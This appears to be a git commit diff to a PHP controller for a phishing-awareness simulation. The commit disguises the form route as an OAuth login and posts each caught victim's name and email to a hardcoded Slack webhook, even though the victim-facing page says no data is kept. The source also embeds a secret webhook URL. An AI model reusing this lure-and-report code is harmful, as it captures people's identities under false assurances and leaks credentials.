4ddc52347b85c3f0c8f8b8d334682c3d12cb6a27
gabriel_de_almeida <gabriel.de-almeida@mister-auto.com>
2022-02-09 15:59:59 +0100

    webhook call ok V1

--- src/Controller/FormController.php
+++ src/Controller/FormController.php
@@ -7,11 +7,24 @@ use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
 use Symfony\Component\HttpFoundation\Request;
 use Symfony\Component\HttpFoundation\Response;
 use Symfony\Component\Routing\Annotation\Route;
+use Symfony\Contracts\HttpClient\Exception\ClientExceptionInterface;
+use Symfony\Contracts\HttpClient\Exception\RedirectionExceptionInterface;
+use Symfony\Contracts\HttpClient\Exception\ServerExceptionInterface;
+use Symfony\Contracts\HttpClient\Exception\TransportExceptionInterface;
+use Symfony\Contracts\HttpClient\HttpClientInterface;
 
 class FormController extends AbstractController
 {
-    #[Route('/', name: 'app_home')]
-    public function index(Request $request): Response
+    private const URL_WEBHOOK = 'https://hooks.slack.com/services/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';
+    private HttpClientInterface $client;
+
+    public function __construct(HttpClientInterface $client)
+    {
+        $this->client = $client;
+    }
+
+    #[Route('/auth/oauthLogin', name: 'app_form')]
+    public function login(Request $request): Response
     {
         $form = $this->createForm(FormType::class);
         $form->handleRequest($request);
@@ -34,12 +47,36 @@ class FormController extends AbstractController
     public function attacked(Request $request): Response
     {
         $text = "Salut %s %s ! Tu viens d'être attaqué par une cyberattaque créée de toute pièces par Jhack Chirac ! Pas de panique, aucune donnée n'est conservée et tu n'as aucune crainte à avoir !";
-        $email = strtok($request->query->get('email'), '@');
-        $emailExploded = explode('.', $email);
+        $email = $request->query->get('email');
+        $formattedEmail = strtok($email, '@');
+        $emailExploded = explode('.', $formattedEmail);
+
         if (count($emailExploded) === 2) {
             $firstName = ucwords(str_replace('-', ' ', array_shift($emailExploded)));
             $lastName = ucwords(str_replace('-', ' ', end($emailExploded)));
             $text = sprintf($text, $lastName, $firstName);
+
+            try {
+                $payload['text'] = sprintf(
+                    'Nouveau poisson ! %s %s s\'est fait avoir par Jhack Chirac ! Son email : %s',
+                    $lastName,
+                    $firstName,
+                    $email
+                );
+
+                $this->client->request(
+                    'POST',
+                    self::URL_WEBHOOK,
+                    [
+                        'json' => $payload,
+                    ]
+                );
+
+            } catch (\Exception $e) {
+                error_log($e->getMessage());
+            } catch (TransportExceptionInterface $e) {
+                error_log($e->getMessage());
+            }
         }
 
         return $this->render('form/trapped.html.twig', [
